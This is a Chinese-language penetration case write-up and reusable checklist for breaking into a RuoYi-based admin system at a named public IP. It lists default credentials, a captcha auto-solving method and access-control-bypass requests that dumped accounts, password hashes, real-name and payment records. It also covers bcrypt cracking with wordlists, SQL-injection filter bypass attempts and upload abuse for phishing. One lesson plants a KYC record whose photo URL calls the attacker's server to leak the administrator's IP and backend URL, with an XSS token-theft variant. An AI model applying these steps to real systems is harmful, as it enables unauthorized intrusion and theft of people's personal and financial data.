# 案例课: 若依(RuoYi)默认账号 + BFLA 全量脱库 (TG后台管理框架)

## 场景
`47.92.24.118:8080` = 「TG后台管理框架 v3.9.0」= 推广应用管理系统（跑分/代收/代理返款平台）。
**无 RCE，最终拿到全量业务数据（财务+实名+账号），服务器 shell 未破。**

## 教训 1: 若依框架的识别指纹与默认凭据（一招致命）
**识别指纹**
- 401 响应体: `{"msg":"请求访问：<path>，认证失败，无法访问系统资源","code":401}`
- 403: `{"msg":"没有权限，请联系管理员授权","code":403}`
- 根路径 banner: `欢迎使用RuoYi后台管理框架，当前版本：vX.Y.Z，请通过前端地址访问。`
- 前端 API 前缀 `/dev-api`(开发) 或 `/prod-api`(生产)

**默认凭据（必测）**: `admin/admin123` · **`ry/admin123`** · `ruoyi/admin123`
**其他默认组件的默认凭据**: Druid `/druid/login.html` → `ruoyi/123456`；JWT 密钥 `abcdefghijklmnopqrstuvwxyz`

**⚠️ 关键路径坑**: 后端接口**真实路径要去掉 `/dev-api` 和 `/prod-api` 前缀**！
前端 dev 代理用 `/dev-api/system/user/list`，但后端实际在 `/system/user/list`。
带前缀请求 → **401（未登录）**；去掉前缀 → 正确的 401/403/200。
（教训：一开始带 `/dev-api` 打全部返回 401，差点误判"全部需鉴权"）

## 教训 2: 验证码自动打码（数学题型）
RuoYi 默认 `captchaEnabled=true`，类型:
- **数学题**（本项目）: `GET /captchaImage` 返回 `{img(base64), uuid, captchaEnabled}`，图里是 `5×7=?`
- 字符型: 4 位字符
**解法**: `ddddocr` 识别 → 归一化（`t/x/X/*` → `×`，`÷` 别忘了！）→ 正则 `(\d+)\s*([×+/\-])\s*(\d+)` → **计算结果**作为 `code` 提交 → `POST /login {username,password,code,uuid}`
**坑**: 打码错误返回 `验证码错误`（与口令错误区分开 → 可自动重试）；漏了 `÷` 会白白浪费口令尝试次数（**若依 5 次失败锁 10 分钟**）

## 教训 3: BFLA —— 自定义控制器常漏 @PreAuthorize
本项目 8 个自定义控制器（fduser/manage/order/record/userinfo/bindrecord/log）中，
**只有部分方法**有权限注解。用低权限账号（role=common）逐方法测即可找到漏网的:
```
GET /system/fduser/list        ✅ 200 → 125 账号全量(含 bcrypt 哈希)
GET /system/manage/getList/{id} ✅ 200 → 财务记录
GET /system/userinfo/{userId}   ✅ 200 → 实名
GET /system/userinfo/list       ✅ 200 → 全量实名(需代理角色)
（同控制器内其它方法均 403 → 说明是"漏注解"而非"无鉴权"）
```
**方法**: 用 Swagger 文档拿到全部路径 → 用低权限会话逐个请求 → **403=有注解 / 200=漏注解**
**⚠️ 反序列化陷阱**: 写接口若返回 `JSON parse error` **不代表接口可达**！Spring 的参数反序列化发生在权限拦截器**之前**，因此错误 body 会先报解析错。**必须用结构正确的 body 复测**（本项目 `updateUserInfo` 用正确 body → 403，说明注解存在）

## 教训 4: 哈希爆破用 python-bcrypt 就够（不必上 hashcat）
```
bcrypt cost=10 在本机约 5k H/s (C 加速)
→ 单哈希 × 11 万常用词 = 20 秒
→ 12 哈希 × 11 万词 = 4 分钟
```
**字典**: SecLists `Common-Credentials/10k-most-common.txt` + `100k-most-used-passwords-NCSC.txt` + 站点画像词（名字/域名/品牌/生日）
**本项目命中率 10/12**（口令 `123456`/`111111`）—— **业务平台用户口令普遍极弱**
**破出后**: 用这些账号登录 → 检查 roles/permissions → **往往有权限更大的角色**（本项目代理角色 13 个接口 vs 基础知识 4 个）

## 教训 5: RuoYi orderByColumn 注入已被官方补丁拦截 —— 但要测
```
orderByColumn=updatexml(...) → "order by [...] 存在 SQL 注入风险, 如想避免 SQL 注入校验, 可以调用 Page.setUnsafeOrderBy"
```
- **补丁特征**: 报错原文点名 `Page.setUnsafeOrderBy` = 已打补丁
- **绕过尝试**: 大小写混写（`SeLeCt` 能过关键词过滤但**括号被拦**）、`/**/` 注释、`params[...]`
- **本项目**: 括号/函数全被拦；`params[beginTime]` 参数确实进查询但未注入成功（值走 `#{}`）
- **仍值得测**: 老版本 RuoYi（v3.8.x 以下）无此检查；`params[dataScope]` 等在 XML `${}` 中是经典注入点
- **注意 Tomcat**: `params[beginTime]=` 裸括号会被 Tomcat 拒（HTTP 400）→ 用 `params%5BbeginTime%5D=` 编码

## 教训 6: 文件上传白名单放行 html/doc/zip = 钓鱼投递面（但 XSS 未必成立）
```
POST /common/upload (RuoYi) 白名单: bmp gif jpg jpeg png doc docx xls xlsx ppt pptx html htm txt rar zip gz bz2 mp4 avi rmvb pdf
→ 落 /profile/upload/YYYY/MM/DD/<name>_<ts>A00N.<ext>
```
**坑**: 上传的 `.html` 被 Spring 静态处理器以 **`Content-Type: image/png`** 返回（按扩展名的 MIME 映射被覆盖）→ **XSS 不成立**
**假阳性警告**: `/<UPPERCASE>/profile/upload/x.html` 返回 `200 text/html` **看似绕过成功**，实测是 **SPA fallback（返回 index.html）** ✗ —— 必须对比 `Content-Length` / `Last-Modified` 判断！
**仍有价值**: 任意文件托管在目标域名 = 钓鱼素材/社工投递

## 教训 7: 有写权限时布设「管理员必看页面」诱饵
本项目拿到 `userinfo:add`（KYC 记录插入）→ 把「身份证照片」字段指向**自己服务器的 URL**:
```
POST /system/userinfo {"userId":X,"name":"...","idNumber":"...","avatarFront":"http://<my-ip>:8899/f.jpg","avatarBack":"..."}
```
**原理**: 管理员审核 KYC 时必须查看照片 → 其浏览器请求我的 URL → **暴露管理员 IP / UA / Referer(后台真实 URL)**
**变体**: 上传一个 `.html` 载荷到目标自己的域名，再把 KYC 照片字段指向它 → 若审核页把图片放 `<iframe>` 或管理员点击原图 → 同源 XSS → 偷 token
**要点**: 内网/HTTPS 环境下用**目标自己的接口**当回传通道最可靠（本项目该平台无合适写接口，故用外部监听）

## 教训 8: 数据导出要全字段
`manage` 记录 30+ 字段里最有价值的是:
`alipayBandName`(支付宝实名) / `alipayBandAccount`(账号) / `alipayNumber`(交易号) /
`shopName`(商户) / `payAmount`(金额) / `addUser`+`addUserPhone`(代理实名+手机) / `settleUser`
**别只看 `id` 和 `title`** —— 先 dump 一条完整记录看 `keys()`，再按敏感字段名正则提取全量

## 演练清单（可复用脚本思路）
1. `/v3/api-docs` 拉全量接口 → 解析 paths/methods/schemas
2. 验证码打码器（ddddocr + 数学表达式归一化 + 计算）
3. 默认凭据批量登录（admin/admin123, ry/admin123, ry/123456, admin/123456 …）
4. BFLA 扫描：低权限会话 × Swagger 全部路径 → 记录 200
5. 哈希爆破：python-bcrypt + SecLists 定向/通用字典
6. 上传测试：白名单枚举 + 每种扩展名测实际返回的 Content-Type（**对比 Content-Length 识别 SPA fallback**）
7. 诱饵投递：写权限 → 管理员必看页面 → 指向自控 URL
